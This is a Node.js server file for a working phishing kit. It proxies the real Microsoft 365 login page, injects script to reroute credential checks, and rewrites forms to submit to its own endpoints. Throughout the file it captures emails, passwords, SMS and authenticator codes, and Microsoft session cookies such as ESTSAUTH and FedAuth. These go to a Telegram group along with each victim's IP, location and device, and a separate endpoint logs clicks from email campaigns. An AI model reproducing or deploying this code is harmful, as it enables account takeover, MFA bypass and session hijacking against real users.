require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const requestIp = require('request-ip');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const { createProxyMiddleware } = require('http-proxy-middleware');
const axios = require('axios');
const cheerio = require('cheerio');

const app = express();
const server = http.createServer(app);

// ============= RENDER-SPECIFIC CONFIGURATION =============
// CRITICAL: Trust proxy to get real IP addresses behind Render's proxy
app.set('trust proxy', true);

// ============= MIDDLEWARE =============
// REMOVED: express.static - no longer serving static files
app.use(cors({
  origin: process.env.NODE_ENV === 'production' 
    ? [process.env.APP_URL || 'https://your-app.onrender.com'] 
    : ['http://localhost:3001', 'http://127.0.0.1:3001'],
  credentials: true
}));
app.use(requestIp.mw());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

const io = new Server(server, {
  cors: {
    origin: process.env.NODE_ENV === 'production'
      ? [process.env.APP_URL || 'https://your-app.onrender.com']
      : ['http://localhost:3001', 'http://127.0.0.1:3001'],
    methods: ['GET', 'POST'],
    credentials: true
  },
  transports: ['polling', 'websocket'],
  pingTimeout: 60000,
  pingInterval: 25000
});

// ============= BOT INITIALIZATION =============
let bot;
let telegramGroupId = process.env.TELEGRAM_GROUP_ID;

const initializeBot = () => {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
  
  // On Render, we use webhook mode (not polling)
  const usePolling = process.env.USE_POLLING === 'true' || process.env.NODE_ENV !== 'production';
  
  if (usePolling) {
    console.log('🔧 Using POLLING mode');
    bot.deleteWebHook()
      .then(() => bot.startPolling())
      .catch(err => console.error('❌ Failed to start polling:', err));
  } else {
    console.log('🚀 Using WEBHOOK mode');
    const webhookUrl = `${process.env.APP_URL}/webhook/${process.env.TELEGRAM_BOT_TOKEN}`;
    bot.setWebHook(webhookUrl)
      .then(() => console.log('✅ Webhook set successfully'))
      .catch(err => console.error('❌ Webhook setup failed:', err));
  }
  
  return bot;
};

initializeBot();

app.post(`/webhook/${process.env.TELEGRAM_BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// ============= SESSION MANAGEMENT =============
const activeSessions = new Map();
const capturedData = new Map();
const microsoftParams = new Map();
const requestTimestamps = new Map();

const SESSION_TIMEOUT = 7200000;
const CLEANUP_INTERVAL = 600000;
const SESSION_COOLDOWN = 5000;

// Cleanup intervals
setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of activeSessions.entries()) {
    if (now - session.lastActivity > SESSION_TIMEOUT) {
      activeSessions.delete(sessionId);
    }
  }
}, CLEANUP_INTERVAL);

// ============= VICTIM INFO CAPTURE HELPER =============
async function getVictimInfo(req) {
  try {
    // With 'trust proxy' enabled, this will get the real IP
    const ip = requestIp.getClientIp(req) || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const agent = useragent.parse(userAgent);
    
    // Get geolocation from IP
    let location = 'Unknown';
    try {
      const geo = geoip.lookup(ip);
      if (geo) {
        location = `${geo.city || 'Unknown City'}, ${geo.region || 'Unknown Region'}, ${geo.country || 'Unknown Country'}`;
      }
    } catch (e) {
      // Ignore geoip errors
    }

    return {
      ip,
      location,
      browser: agent.toAgent() || 'Unknown',
      os: agent.os.toString() || 'Unknown',
      device: agent.device.toString() === 'undefined' ? 'Desktop' : agent.device.toString(),
      timestamp: new Date().toLocaleString()
    };
  } catch (err) {
    console.error('Error getting victim info:', err);
    return {
      ip: 'Unknown',
      location: 'Unknown',
      browser: 'Unknown',
      os: 'Unknown',
      device: 'Unknown',
      timestamp: new Date().toLocaleString()
    };
  }
}

// ============= SOCKET.IO HANDLERS =============
io.on('connection', (socket) => {
  let sessionId = socket.handshake.query.sessionId || uuidv4();
  
  if (!activeSessions.has(sessionId)) {
    activeSessions.set(sessionId, {
      stage: 'initial',
      lastActivity: Date.now(),
      details: null,
      email: null,
      password: null,
      sockets: new Set([socket.id]),
      createdAt: Date.now()
    });
  } else {
    const session = activeSessions.get(sessionId);
    session.sockets.add(socket.id);
    session.lastActivity = Date.now();
  }

  socket.emit('connection_established', { sessionId });

  socket.on('client_info', (userAgent) => {
    const session = activeSessions.get(sessionId);
    if (session) {
      const ip = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
      const geo = geoip.lookup(ip) || {};
      const agent = useragent.parse(userAgent);
      
      session.details = {
        ip,
        location: geo.country ? `${geo.city || 'Unknown'}, ${geo.country}` : 'Unknown',
        browser: agent.toAgent(),
        os: agent.os.toString(),
        timestamp: new Date().toLocaleString()
      };
      session.lastActivity = Date.now();
    }
  });

  socket.on('submit_email', async (email) => {
    const session = activeSessions.get(sessionId);
    if (!session) return;
    
    session.email = email;
    session.stage = 'awaiting_password';
    session.lastActivity = Date.now();

    const message = `📧 New Login Request\n━━━━━━━━━━━━━━━━━━\nEmail: ${email}`;
    await bot.sendMessage(telegramGroupId, message, {
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔑 Request Password', callback_data: `request_password|${sessionId}` }]
        ]
      }
    });
    
    socket.emit('email_sent');
  });

  socket.on('submit_password', async (password) => {
    const session = activeSessions.get(sessionId);
    if (!session) return;
    
    session.password = password;
    session.stage = 'awaiting_action';
    session.lastActivity = Date.now();

    await bot.sendMessage(telegramGroupId, 
      `🔒 Password received for ${session.email}\nPassword: ${password}`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 Request SMS Code', callback_data: `request_sms|${sessionId}` }],
            [{ text: '🔐 Request Auth Code', callback_data: `request_auth|${sessionId}` }],
            [{ text: '✅ Done', callback_data: `done|${sessionId}` }]
          ]
        }
      }
    );
    
    socket.emit('password_sent');
  });

  socket.on('disconnect', () => {
    const session = activeSessions.get(sessionId);
    if (session) {
      session.sockets.delete(socket.id);
      session.lastActivity = Date.now();
    }
  });
});

// ============= TELEGRAM BOT HANDLERS =============
bot.on('callback_query', async (cb) => {
  const [action, sessionId] = cb.data.split('|');
  const session = activeSessions.get(sessionId);
  
  if (!session) {
    await bot.answerCallbackQuery(cb.id, { text: 'Session expired', show_alert: true });
    return;
  }

  session.lastActivity = Date.now();

  if (action === 'request_password') {
    sendToSession(sessionId, 'request_password');
    await bot.answerCallbackQuery(cb.id, { text: 'Requesting password' });
  } else if (action === 'request_sms' || action === 'request_auth') {
    const codeType = action === 'request_sms' ? 'sms' : 'authenticator';
    sendToSession(sessionId, 'request_2fa', codeType);
    await bot.answerCallbackQuery(cb.id, { text: `Requesting ${codeType} code` });
  } else if (action === 'done') {
    sendToSession(sessionId, 'redirect_to_gmail');
    await bot.sendMessage(telegramGroupId, 
      `✅ Login complete for ${session.email}\nPassword: ${session.password || 'N/A'}`
    );
    await bot.answerCallbackQuery(cb.id, { text: 'Redirecting user' });
  }
});

function sendToSession(sessionId, event, data) {
  const session = activeSessions.get(sessionId);
  if (!session) return false;
  
  for (const socketId of session.sockets) {
    const socket = io.sockets.sockets.get(socketId);
    if (socket?.connected) socket.emit(event, data);
  }
  return true;
}

// ============= ROOT REDIRECT =============
app.get('/', (req, res) => {
  console.log('↪️ Redirecting root to /microsoft');
  res.redirect('/microsoft');
});

// ============= MICROSOFT LOGIN PAGE FETCHER =============
const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com';

app.get('/microsoft', async (req, res) => {
  try {
    const clientIp = requestIp.getClientIp(req) || 'unknown';
    const now = Date.now();
    
    const lastRequest = requestTimestamps.get(clientIp) || 0;
    if (now - lastRequest < SESSION_COOLDOWN) {
      // Instead of sending static file, just fetch a new page with rate limit message
      return res.send(`
        <html>
          <head><title>Rate Limited</title></head>
          <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h2>Too many requests</h2>
            <p>Please wait a few seconds before trying again.</p>
            <a href="/microsoft">Try Again</a>
          </body>
        </html>
      `);
    }
    requestTimestamps.set(clientIp, now);
    
    const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    const microsoftResponse = await axios({
      method: 'GET',
      url: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
      params: {
        client_id: '9199bf20-a13f-4107-85dc-02114787ef48',
        scope: 'https://outlook.office.com/.default openid profile offline_access',
        redirect_uri: 'https://outlook.live.com/mail/',
        response_type: 'code',
        response_mode: 'fragment',
        client_info: '1',
        prompt: 'select_account',
        cobrandid: 'ab0455a0-8d03-46b9-b18b-df2f57b9e44c'
      },
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      maxRedirects: 5,
      timeout: 10000
    });

    let html = microsoftResponse.data;
    
    if (microsoftResponse.status === 302 || microsoftResponse.status === 301) {
      const redirectResponse = await axios.get(microsoftResponse.headers.location, {
        headers: { 'User-Agent': 'Mozilla/5.0' }
      });
      html = redirectResponse.data;
    }

    const $ = cheerio.load(html);
    const params = {};
    
    // Add fetch/XHR interception
    $('head').append(`
      <script>
        (function() {
          const originalFetch = window.fetch;
          window.fetch = function(url, options = {}) {
            if (typeof url === 'string' && url.includes('/GetCredentialType')) {
              console.log('🔄 Redirecting API call:', url);
              return originalFetch('/proxy/GetCredentialType', options);
            }
            return originalFetch(url, options);
          };
          
          const originalXHR = window.XMLHttpRequest;
          window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const originalOpen = xhr.open;
            xhr.open = function(method, url, ...args) {
              if (typeof url === 'string' && url.includes('/GetCredentialType')) {
                url = '/proxy/GetCredentialType';
              }
              return originalOpen.call(this, method, url, ...args);
            };
            return xhr;
          };
        })();
      </script>
    `);

    // Add error handling script
    $('body').append(`
      <script>
        (function() {
          const urlParams = new URLSearchParams(window.location.search);
          const error = urlParams.get('error');
          const username = urlParams.get('username');
          
          if (error === 'invalid_password') {
            const errorDiv = document.createElement('div');
            errorDiv.style.cssText = 'background-color: #f8d7da; color: #721c24; padding: 12px; border-radius: 4px; margin-bottom: 20px; border: 1px solid #f5c6cb; text-align: center;';
            errorDiv.textContent = username ? \`Incorrect password for \${username}. Please try again.\` : 'Incorrect password. Please try again.';
            
            const form = document.querySelector('form');
            if (form) {
              form.parentNode.insertBefore(errorDiv, form);
            }
            
            if (username) {
              const emailInput = document.querySelector('input[name="login"]');
              if (emailInput) emailInput.value = username;
            }
          }
          
          sessionStorage.setItem('phishSessionId', '${sessionId}');
        })();
      </script>
    `);

    // Capture input fields
    $('input').each((i, elem) => {
      const name = $(elem).attr('name');
      const value = $(elem).attr('value') || '';
      if (name && value) params[name] = value;
    });
    
    const defaultParams = {
      client_id: '9199bf20-a13f-4107-85dc-02114787ef48',
      redirect_uri: 'https://outlook.live.com/mail/',
      response_type: 'code',
      scope: 'https://outlook.office.com/.default openid profile offline_access'
    };
    
    Object.assign(params, defaultParams);
    microsoftParams.set(sessionId, params);
    
    // Change form action to /proxy/login
    $('form').each((i, form) => {
      $(form).attr('action', '/proxy/login');
      $(form).attr('method', 'POST');
      $(form).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
      
      Object.entries(defaultParams).forEach(([key, value]) => {
        if (!$(form).find(`input[name="${key}"]`).length) {
          $(form).append(`<input type="hidden" name="${key}" value="${value}">`);
        }
      });
    });
    
    res.send($.html());
    
  } catch (error) {
    console.error('Error fetching Microsoft page:', error.message);
    // Instead of sending static file, show error page
    res.status(500).send(`
      <html>
        <head><title>Error</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
          <h2>Unable to load Microsoft login page</h2>
          <p>Please try again later.</p>
          <a href="/microsoft">Try Again</a>
        </body>
      </html>
    `);
  }
});

// ============= PROXY HANDLERS =============

// Handle GetCredentialType API
app.post('/proxy/GetCredentialType', express.json(), async (req, res) => {
  try {
    const response = await axios.post(
      'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US',
      req.body,
      {
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0',
          'Origin': 'https://login.microsoftonline.com'
        }
      }
    );
    res.json(response.data);
  } catch (error) {
    res.json({
      Exists: true,
      ThrottleStatus: 0,
      Credential: { IsSignupDisallowed: false },
      EstsProperties: { IsSignupDisallowed: false }
    });
  }
});

// ============= HANDLE COMMON LOGIN ENDPOINT WITH WRONG PASSWORD REDIRECT =============

// Handle POST requests to /common/login with enhanced victim info
app.post('/common/login', express.urlencoded({ extended: true }), async (req, res) => {
  console.log('📥 POST to /common/login received');
  
  // Get victim information
  const victimInfo = await getVictimInfo(req);
  
  // Capture any credentials in the request
  const sessionId = req.body?.sessionId || 'unknown';
  const username = req.body?.login || req.body?.username;
  const password = req.body?.passwd || req.body?.password;
  
  if (username && password) {
    console.log(`🔑 Credentials captured from /common/login: ${username}`);
    console.log(`   IP: ${victimInfo.ip}`);
    console.log(`   Location: ${victimInfo.location}`);
    
    // Send enhanced Telegram notification with victim info
    if (bot && telegramGroupId) {
      const message =
       
        `🔑 *---(Post-Auth) Captured By Smoke---*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Email:* \`${username}\`\n` +
        `*Password:* \`${password}\`\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Victim Information:*\n` +
        `*IP:* \`${victimInfo.ip}\`\n` +
        `*Location:* ${victimInfo.location}\n` +
        `*Browser:* ${victimInfo.browser}\n` +
        `*OS:* ${victimInfo.os}\n` +
        `*Device:* ${victimInfo.device}\n` +
        `*Time:* ${victimInfo.timestamp}`;
      
      bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
        .catch(() => {});
    }
    
    const session = capturedData.get(sessionId) || {};
    session.credentials = { 
      username, 
      password, 
      time: new Date().toISOString(),
      victimInfo 
    };
    capturedData.set(sessionId, session);
  }
  
  // Forward the POST request to the real Microsoft login endpoint
  try {
    const formData = new URLSearchParams();
    Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
    
    const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Origin': 'https://login.microsoftonline.com',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      maxRedirects: 0,
      validateStatus: status => status >= 200 && status < 400
    }).catch(err => err.response);
    
    // Handle redirects from Microsoft
    if (response?.headers?.location) {
      const location = response.headers.location;
      console.log(`↪️ Microsoft redirects to: ${location}`);
      
      // If it's a redirect back to login (wrong password, etc.)
      if (location.includes('/common/login')) {
        // Extract error information if available
        const errorMatch = location.match(/error=([^&]+)/);
        const error = errorMatch ? errorMatch[1] : 'invalid_password';
        
        console.log(`❌ Wrong password detected for: ${username}`);
        
        // REDIRECT BACK TO /microsoft WITH ERROR PARAMETER
        return res.redirect(`/microsoft?error=invalid_password&username=${encodeURIComponent(username || '')}`);
      }
      
      // For other redirects (successful login, etc.), follow them
      return res.redirect(location);
    }
    
    res.send(response?.data || 'OK');
    
  } catch (error) {
    console.error('❌ Error forwarding to /common/login:', error.message);
    res.redirect('/microsoft?error=connection_error');
  }
});

// Handle GET requests to /common/login (this happens when redirected back)
app.get('/common/login', (req, res) => {
  console.log('🔄 GET to /common/login - redirecting to Microsoft page with error');
  
  // Extract error and username from query parameters
  const error = req.query.error || 'invalid_password';
  const username = req.query.username || '';
  
  // REDIRECT TO /microsoft WITH ERROR PARAMETERS
  res.redirect(`/microsoft?error=${error}&username=${encodeURIComponent(username)}`);
});

// Handle the proxied version
app.post('/proxy/common/login', express.urlencoded({ extended: true }), async (req, res) => {
  req.url = '/common/login';
  app._router.handle(req, res);
});

app.get('/proxy/common/login', (req, res) => {
  const error = req.query.error || 'invalid_password';
  const username = req.query.username || '';
  res.redirect(`/microsoft?error=${error}&username=${encodeURIComponent(username)}`);
});

// Handle login form submissions with enhanced victim info
app.post('/proxy/login', express.urlencoded({ extended: true }), async (req, res) => {
  console.log('📥 Login form submission to /proxy/login');
  
  const sessionId = req.body?.sessionId || 'unknown';
  const username = req.body?.login;
  const password = req.body?.passwd;
  
  // Get victim information
  const victimInfo = await getVictimInfo(req);
  
  if (username && password) {
    console.log(`🔑 Password entered for: ${username}`);
    console.log(`   IP: ${victimInfo.ip}`);
    console.log(`   Location: ${victimInfo.location}`);
    
    // Send enhanced Telegram notification with victim info
    if (bot && telegramGroupId) {
      const message = 
        `🔑 *Login Credentials Captured!*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Email:* \`${username}\`\n` +
        `*Password:* \`${password}\`\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Victim Information:*\n` +
        `*IP:* \`${victimInfo.ip}\`\n` +
        `*Location:* ${victimInfo.location}\n` +
        `*Browser:* ${victimInfo.browser}\n` +
        `*OS:* ${victimInfo.os}\n` +
        `*Device:* ${victimInfo.device}\n` +
        `*Time:* ${victimInfo.timestamp}`;
      
      bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
        .catch(() => {});
    }
    
    const session = capturedData.get(sessionId) || {};
    session.credentials = { 
      username, 
      password, 
      time: new Date().toISOString(),
      victimInfo 
    };
    capturedData.set(sessionId, session);
  }
  
  // Forward to Microsoft's /common/login endpoint
  try {
    const formData = new URLSearchParams();
    Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
    
    const response = await axios({
      method: 'POST',
      url: 'https://login.microsoftonline.com/common/login',
      data: formData.toString(),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Origin': 'https://login.microsoftonline.com',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      maxRedirects: 0,
      validateStatus: status => status >= 200 && status < 400
    }).catch(err => err.response);
    
    if (response?.headers?.location) {
      const location = response.headers.location;
      console.log(`↪️ Microsoft redirects to: ${location}`);
      
      // Handle different redirect scenarios
      if (location.includes('/common/login')) {
        // This is a redirect back to login (wrong password, etc.)
        const errorMatch = location.match(/error=([^&]+)/);
        const error = errorMatch ? errorMatch[1] : 'invalid_password';
        
        console.log(`❌ Wrong password detected - redirecting back to /microsoft`);
        
        // REDIRECT BACK TO /common/login WHICH WILL THEN REDIRECT TO /microsoft
        return res.redirect(`/common/login?error=${error}&username=${encodeURIComponent(username || '')}`);
      }
      
      // For successful login or other redirects
      return res.redirect(location);
    }
    
    res.send(response?.data || 'OK');
    
  } catch (error) {
    console.error('❌ Login proxy error:', error.message);
    res.redirect('/common/login?error=connection_error');
  }
});

// ============= ENHANCED PROXY MIDDLEWARE WITH COMPREHENSIVE COOKIE CAPTURE =============
const microsoftProxy = createProxyMiddleware({
  target: MICROSOFT_LOGIN_URL,
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  selfHandleResponse: true,
  logLevel: 'silent',
  on: {
    proxyReq: (proxyReq, req, res) => {
      const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
      proxyReq.setHeader('Host', 'login.microsoftonline.com');
      
      if (req.method === 'POST' && req.body?.login && req.body?.passwd) {
        const session = capturedData.get(sessionId) || {};
        session.credentials = {
          username: req.body.login,
          password: req.body.passwd,
          time: new Date().toISOString()
        };
        capturedData.set(sessionId, session);
      }
    },
    
    proxyRes: async (proxyRes, req, res) => {
      const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
      const cookies = proxyRes.headers['set-cookie'];
      
      if (cookies) {
        const session = capturedData.get(sessionId) || { cookies: [] };
        session.cookies = [...(session.cookies || []), ...cookies];
        
        // Define all Microsoft session cookies to look for
        const criticalCookiePatterns = [
          { name: 'FedAuth', description: 'Primary authentication cookie' },
          { name: 'x-ms-gateway-token', description: 'Gateway session token' },
          { name: 'ESTSAUTH', description: 'Microsoft account auth' },
          { name: 'ESTSAUTHPERSISTENT', description: 'Persistent login' },
          { name: 'MSISAuth', description: 'Legacy auth' },
          { name: 'SignInStateCookie', description: 'Sign-in state' }
        ];
        
        // Track captured cookies
        const capturedCookies = [];
        
        cookies.forEach(cookie => {
          criticalCookiePatterns.forEach(pattern => {
            if (cookie.includes(pattern.name)) {
              capturedCookies.push({
                pattern: pattern.name,
                description: pattern.description,
                fullCookie: cookie
              });
              console.log(`🔥 ${pattern.name} (${pattern.description}) captured for session: ${sessionId}`);
            }
          });
        });
        
        // Send comprehensive Telegram notification if any critical cookies were captured
        if (capturedCookies.length > 0 && bot && telegramGroupId) {
          const victimInfo = await getVictimInfo(req);
          
          // Format the cookie summary
          const cookieSummary = capturedCookies.map(c => 
            `• *${c.pattern}*: ${c.description}`
          ).join('\n');
          
          // Get the full cookie values (truncated for readability)
          const fullCookieValues = capturedCookies.map(c => {
            const match = c.fullCookie.match(new RegExp(`${c.pattern}=([^;]+)`));
            const value = match ? match[1] : 'unknown';
            return `• ${c.pattern}: \`${value.substring(0, 30)}${value.length > 30 ? '...' : ''}\``;
          }).join('\n');
          
          const message = 
            `🍪 *Microsoft 365 Session Cookies Captured!*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `*Session:* \`${sessionId}\`\n` +
            `*Cookies captured (${capturedCookies.length}):*\n${cookieSummary}\n\n` +
            `*Cookie Values:*\n${fullCookieValues}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `*Victim Information:*\n` +
            `*IP:* \`${victimInfo.ip}\`\n` +
            `*Location:* ${victimInfo.location}\n` +
            `*Browser:* ${victimInfo.browser}\n` +
            `*OS:* ${victimInfo.os}\n` +
            `*Device:* ${victimInfo.device}\n` +
            `*Time:* ${victimInfo.timestamp}`;
          
          bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
            .catch(() => {});
        }
        
        capturedData.set(sessionId, session);
      }
      
      let body = [];
      proxyRes.on('data', chunk => body.push(chunk));
      proxyRes.on('end', () => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        res.end(Buffer.concat(body));
      });
    },
    
    error: (err, req, res) => {
      console.error('Proxy error:', err.message);
      // Enhanced error handling for ECONNRESET
      if (err.code === 'ECONNRESET') {
        return res.redirect('/microsoft?error=connection_reset');
      }
      res.redirect(`https://login.microsoftonline.com${req.url}`);
    }
  }
});

// Mount proxy middleware
app.use('/proxy', (req, res, next) => {
  const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
  const msParams = microsoftParams.get(sessionId) || {};
  
  if (req.method === 'POST') {
    req.body = { ...msParams, ...req.body };
    Object.assign(req.body, {
      client_id: '9199bf20-a13f-4107-85dc-02114787ef48',
      redirect_uri: 'https://outlook.live.com/mail/',
      response_type: 'code',
      scope: 'https://outlook.office.com/.default openid profile offline_access'
    });
  }
  
  microsoftProxy(req, res, next);
});

// ============= CAPTURE ENDPOINTS =============
app.get('/capture', async (req, res) => {
  const { email = 'unknown', redirect = 'https://google.com' } = req.query;
  const cookies = req.cookies || {};
  
  if (bot && telegramGroupId && Object.keys(cookies).length > 0) {
    const victimInfo = await getVictimInfo(req);
    const cookiesText = Object.entries(cookies).map(([k, v]) => `• ${k}: ${v}`).join('\n');
    
    const message = 
      `🍪 *Cookies Captured*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Email:* ${email}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Victim Information:*\n` +
      `*IP:* \`${victimInfo.ip}\`\n` +
      `*Location:* ${victimInfo.location}\n` +
      `*Browser:* ${victimInfo.browser}\n` +
      `*OS:* ${victimInfo.os}\n` +
      `*Time:* ${victimInfo.timestamp}\n\n` +
      `*Cookies:*\n${cookiesText}`;
    
    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
      .catch(() => {});
  }
  
  res.redirect(302, redirect);
});

// ============= HEALTH CHECK ENDPOINT FOR RENDER =============
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: Date.now(),
    uptime: process.uptime(),
    activeSessions: activeSessions.size,
    capturedSessions: capturedData.size
  });
});



app.get('/track/click', async (req, res) => {
  try {
    // Get tracking parameters from query string
    const {
      email = 'unknown',
      campaign = 'unknown',
      link = '#',
      template = 'unknown',
      name = 'unknown'
    } = req.query;

    // Get client details
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    // Parse user agent for basic info
    const agent = useragent.parse(userAgent);
    
    // Get location from IP (if geoip is available)
    let location = 'Unknown';
    try {
      const geo = geoip.lookup(ip);
      if (geo) {
        location = `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}`;
      }
    } catch (e) {
      // Ignore geoip errors
    }

    // Current time
    const clickTime = new Date().toLocaleString();

    // Create a short token for reference
    const token = crypto.randomBytes(4).toString('hex');

    // Log the click
    console.log(`\n🔗 LINK CLICKED [${token}]`);
    console.log(`   Email: ${email}`);
    console.log(`   Campaign: ${campaign}`);
    console.log(`   Link: ${link}`);
    console.log(`   IP: ${ip}`);
    console.log(`   Time: ${clickTime}`);

    // Send Telegram notification
    if (bot && telegramGroupId) {
      const message = 
        `🔗 *Link Clicked!*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Email:* \`${email}\`\n` +
        `*Name:* ${name}\n` +
        `*Campaign:* ${campaign}\n` +
        `*Template:* ${template}\n` +
        `*Link:* ${link}\n` +
        `*IP:* \`${ip}\`\n` +
        `*Location:* ${location}\n` +
        `*Browser:* ${agent.toAgent() || 'Unknown'}\n` +
        `*OS:* ${agent.os.toString() || 'Unknown'}\n` +
        `*Time:* ${clickTime}\n` +
        `*Token:* \`${token}\``;

      await bot.sendMessage(telegramGroupId, message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });
      
      console.log(`✅ Telegram notification sent for click ${token}`);
    }

    // Redirect to the actual link
    if (link && link !== '#') {
      return res.redirect(302, link);
    } else {
      // If no link provided, show a simple thank you page
      return res.send(`
        <html>
          <head>
            <title>Link Tracked</title>
            <style>
              body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
              .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
              h2 { color: #333; }
              p { color: #666; }
            </style>
          </head>
          <body>
            <div class="container">
              <h2>✅ Click Tracked</h2>
              <p>Your click has been recorded.</p>
              <p><small>Campaign: ${campaign}</small></p>
            </div>
          </body>
        </html>
      `);
    }

  } catch (error) {
    console.error('❌ Error tracking click:', error);
    
    // Still try to redirect even if tracking fails
    if (req.query.link && req.query.link !== '#') {
      return res.redirect(302, req.query.link);
    }
    
    res.status(500).send('Error tracking click');
  }
});
















// ============= DEBUG ENDPOINTS =============
app.get('/captured-sessions', (req, res) => {
  const sessions = Array.from(capturedData.entries()).map(([id, data]) => ({
    id,
    username: data.credentials?.username,
    hasPassword: !!data.credentials?.password,
    cookieCount: data.cookies?.length || 0,
    criticalCookies: data.cookies?.filter(c => 
      c.includes('FedAuth') || 
      c.includes('x-ms-gateway-token') || 
      c.includes('ESTSAUTH') || 
      c.includes('ESTSAUTHPERSISTENT') || 
      c.includes('MSISAuth') || 
      c.includes('SignInStateCookie')
    ).length || 0,
    victimInfo: data.credentials?.victimInfo || data.victimInfo,
    time: data.credentials?.time
  }));
  res.json({ total: capturedData.size, sessions });
});

app.get('/test', (req, res) => {
  res.json({ 
    status: 'ok', 
    activeSessions: activeSessions.size,
    capturedSessions: capturedData.size
  });
});

// ============= ERROR HANDLING =============
// REMOVED: static file serving - now returns JSON 404 for unmatched routes
app.use((req, res) => {
  // Return JSON 404 for any unmatched routes
  res.status(404).json({ 
    error: 'Endpoint not found',
    path: req.path,
    message: 'The requested endpoint does not exist'
  });
});

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ 
    error: 'Internal server error',
    message: err.message 
  });
});

// ============= START SERVER =============
const PORT = process.env.PORT || 3001;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`↪️ Root URL (/) redirects to /microsoft`);
  console.log(`🎯 Microsoft page: http://localhost:${PORT}/microsoft`);
  console.log(`🍪 Captured sessions: http://localhost:${PORT}/captured-sessions`);
  console.log(`❤️ Health check: http://localhost:${PORT}/health`);
});